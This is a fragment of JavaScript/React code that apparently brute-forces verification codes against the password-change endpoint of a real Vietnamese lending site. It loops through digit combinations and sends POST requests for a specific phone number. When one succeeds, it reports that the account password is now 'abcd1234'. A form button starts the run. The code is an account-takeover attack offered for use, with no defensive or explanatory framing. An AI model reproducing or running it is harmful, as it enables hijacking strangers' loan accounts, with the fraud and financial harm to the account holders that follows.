                ...
                if (start === 0) {
                    for (let i = 0; i <= 9; i++) {
                        for (let j = 0; j <= 9; j++) {
                            for (let k = 0; k <= 9; k++) {
                                ...
                                // console.log(number)
                                fetch('https://vayday.vn/smart-loan/modify/password', {
                                    method: 'POST',
                                    headers: {
                                        ...
                                        'Referer': 'https://vayday.vn/home/password?phone=0905321456',
                    ...
                    for (let index = start; index <= values.start + 1000; index++) {
                        fetch('https://vayday.vn/smart-loan/modify/password', {
                            ...
                            .then(json => {
                                console.log(json.status.msg)
                                setstatus('Đã lọc:'+ index+" Kết quả:"+ json.status.msg)
                                if (json.status.msg === 'Thực hiện thành công') {
                                    alert('Mật khẩu đã được đổi thành abcd1234');
                                    setstatus('Đã xong')
                                    return;
            ...
            {formik => (
                ...
                <form onSubmit={formik.handleSubmit}>
                    <div className="container">
                        ...
                        <button className=" btn btn-light" type="submit">Bắt đầu lọc</button>
